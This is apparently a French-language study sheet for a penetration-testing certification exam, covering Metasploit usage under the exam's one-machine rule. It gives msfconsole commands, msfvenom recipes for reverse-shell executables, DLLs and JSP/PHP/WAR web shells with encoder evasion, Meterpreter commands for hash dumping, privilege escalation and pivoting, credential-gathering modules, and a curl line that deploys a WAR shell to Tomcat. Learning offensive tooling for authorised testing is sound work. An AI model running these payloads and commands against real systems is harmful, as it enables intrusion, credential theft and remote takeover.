# 19 — The Metasploit Framework

## Objectifs
Utiliser MSF efficacement **sans en dépendre** : une seule machine de l'examen peut en bénéficier (payloads compris).

---

## 1. Règle d'or de l'examen

> Metasploit, Meterpreter **et msfvenom** ne peuvent être utilisés que sur **une seule** machine cible.
> Choisir la machine où MSF apporte un vrai gain (exploit complexe, pivoting intégré), pas celle qui se fait à la main en 10 min.

```bash
# Noter la machine « MSF »
echo "MSF autorisé : 192.168.120.12" >> /root/exam/00-notes/msf-rule.txt
```

---

## 2. Bases

```bash
msfconsole -q
```

```text
msf6 > search type:exploit name:smb
msf6 > search cve:2021-44228
msf6 > info exploit/windows/smb/ms17_010_eternalblue
msf6 > use 0
msf6 > show options
msf6 > show payloads
msf6 > show advanced
msf6 > set RHOSTS 10.10.10.20
msf6 > set LHOST tun0
msf6 > set LPORT 4444
msf6 > run / exploit
```

Commandes utiles :
```text
sessions -l          # lister
sessions -i 1        # entrer
background           # Ctrl+Z
db_import scan.xml   # importer nmap
hosts / services / vulns
workspace -a exam
```

---

## 3. Modules utiles

| Module | Usage |
|---|---|
| `auxiliary/scanner/smb/smb_version` | version SMB |
| `auxiliary/scanner/smb/smb_login` | brute force SMB |
| `auxiliary/scanner/ssh/ssh_login` | SSH |
| `auxiliary/scanner/http/dir_scanner` | dirs |
| `auxiliary/gather/...` | collecte |
| `exploit/windows/smb/ms17_010_eternalblue` | MS17-010 |
| `exploit/multi/http/tomcat_mgr_upload` | Tomcat |
| `exploit/unix/webapp/wp_admin_shell_upload` | WordPress |
| `post/multi/recon/local_exploit_suggester` | privesc |
| `post/windows/gather/hashdump` | hashes |
| `post/multi/manage/shell_to_meterpreter` | upgrade |

---

## 4. Payloads

```bash
# Staged (plus petit, nécessite un handler) vs stageless
windows/x64/meterpreter/reverse_tcp        # staged
windows/x64/meterpreter_reverse_tcp        # stageless
```

```text
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > set LPORT 4444
msf6 > exploit -j          # job en arrière-plan
```

### Handler autonome
```text
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > set LPORT 4444
msf6 > run
```

---

## 5. msfvenom

```bash
# Windows exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f dll -o hijack.dll

# ASP / JSP / PHP / WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.jsp
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o shell.elf

# Encodage + bad chars
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 5 -f c
```

```bash
# Listener (hors MSF, ne consomme pas le quota si c'est juste nc)
rlwrap nc -lvnp 4444
```

---

## 6. Meterpreter essentiel

```text
sysinfo
getuid
getsystem
hashdump
ls / cd / cat
download C:\Users\Administrator\Desktop\proof.txt
upload /tmp/tool.exe C:\\Temp\\tool.exe
shell
ps
migrate <PID>
portfwd add -l 8080 -p 80 -r 10.10.10.50
route add 172.16.5.0/24 <session_id>
background
```

```text
# Pivot complet via MSF
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.0/24
set PORTS 445,3389,80
run
```

---

## 7. Post-exploitation

```text
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

use post/windows/gather/enum_logged_on_users
use post/windows/gather/credentials/credential_collector
use post/multi/gather/ssh_creds
use post/linux/gather/enum_configs
```

---

## 8. Sans Metasploit (l'alternative à connaître)

| MSF | Manuel |
|---|---|
| `ms17_010_eternalblue` | PoC Python (AutoBlue) |
| `tomcat_mgr_upload` | `curl -u tomcat:s3cret -F "file=@shell.war" http://host:8080/manager/text/deploy?path=/shell` |
| `psexec` | `impacket-psexec` |
| `hashdump` | `impacket-secretsdump` |
| `portfwd` | chisel / ssh -L |
| `msfvenom -f exe` | C compilé / PowerShell |

> Toujours avoir l'équivalent manuel écrit dans les notes : c'est ce qui sauve si le quota MSF est déjà consommé.

---

## 9. Pièges

| Piège | Conséquence |
|---|---|
| Utiliser msfvenom sur 2 machines | machine invalidée |
| Oublier `set LHOST tun0` | payload vers 127.0.0.1 |
| Payload trop gros pour l'injection | crash |
| Session Meterpreter qui meurt au reboot | privilégier un shell stable |
| `exploit` bloquant | utiliser `-j` |
| Pas de session enregistrée | perdre la machine au timeout |

---

## 10. Checklist

- [ ] Machine MSF choisie et notée
- [ ] `search` + `info` avant `use`
- [ ] LHOST/LPORT vérifiés (interface VPN)
- [ ] Handler lancé avant l'exploit
- [ ] Session stabilisée / upgradée
- [ ] Post-exploitation : hashes, proof, pivot
- [ ] Équivalent manuel noté au cas où
